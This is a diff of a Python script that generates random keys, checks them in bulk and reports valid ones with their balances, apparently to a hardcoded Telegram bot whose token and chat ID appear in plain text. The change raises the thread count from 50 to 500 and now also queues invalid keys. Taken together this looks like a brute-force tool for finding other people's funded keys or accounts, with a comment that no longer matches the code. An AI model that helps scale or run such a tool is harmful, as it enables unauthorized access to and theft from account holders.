@@ -8,7 +8,7 @@ from queue import Queue
 TELEGRAM_BOT_TOKEN = "8067414697:AAGKY6wj90vn2U8ikSloAbXCkYICnmelixg"
 TELEGRAM_CHAT_ID = "5077777510"
 REQUEST_TIMEOUT = 5  # seconds
-MAX_THREADS = 50  # Number of concurrent threads
+MAX_THREADS = 500  # Number of concurrent threads
 RESULTS_QUEUE = Queue()
 
 def generate_random_key():
@@ -31,7 +31,6 @@ def check_key(key):
                     RESULTS_QUEUE.put(f"✅ VALID KEY: {key}\nBalance: ${balance}")
             else:
                 RESULTS_QUEUE.put(f"❌ Invalid key: {key}")  # Uncomment to see invalid keys
-                pass
     except Exception as e:
         RESULTS_QUEUE.put(f"⚠️ Error checking {key[:12]}...: {str(e)}")
 
